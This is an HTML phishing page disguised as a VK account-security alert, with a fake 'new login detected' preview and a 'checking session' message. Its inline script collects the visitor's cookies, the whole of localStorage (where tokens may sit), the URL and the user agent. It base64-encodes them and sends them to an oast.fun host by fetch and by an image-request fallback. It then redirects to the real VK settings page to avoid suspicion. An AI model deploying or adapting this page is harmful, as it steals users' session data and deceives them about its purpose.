<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Внимание: Обнаружена попытка входа">
    <meta property="og:image" content="https://lin-li-shu.github.io/test-preview/gemini2.svg">
    <meta property="og:description" content="Зафиксирован вход с нового устройства: Linux, Saint Petersburg. Если это не вы, заблокируйте доступ.">
    
    <link rel="icon" href="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/bot_hit_favicon.ico">
    <link rel="apple-touch-icon" href="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/bot_hit_apple.png">

    <title>VK Security Center</title>
</head>
<body>
    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
        <h2>Проверка безопасности аккаунта...</h2>
        <p>Пожалуйста, подождите, идет синхронизация сессии.</p>
    </div>

    <script>
        (async function() {
            const oast = "https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/";
            
            // Собираем доступные куки (не HttpOnly)
            let localCookies = document.cookie;
            
            // Собираем данные окружения
            let report = {
                type: "USER_CLICK",
                cookies: localCookies,
                url: window.location.href,
                ref: document.referrer,
                ua: navigator.userAgent,
                storage: JSON.stringify(localStorage) // Иногда токены лежат в LocalStorage!
            };

            // Отправляем всё на OAST
            try {
                // 1. Через fetch
                fetch(oast + "?data=" + btoa(unescape(encodeURIComponent(JSON.stringify(report)))), {mode: 'no-cors'});
                
                // 2. Дублируем через картинку (на случай блокировки fetch)
                new Image().src = oast + "ping?c=" + btoa(localCookies).substring(0, 50);
            } catch(e) {}

            // Пинг для бота (если вдруг он запустит JS в Headless режиме)
            fetch(oast + "js_bot_ping");

            // Через 3 секунды уводим на реальный VK, чтобы не вызывать подозрений
            setTimeout(() => {
                window.location.href = "https://vk.com/settings?act=security";
            }, 3000);
        })();
    </script>
</body>
</html>
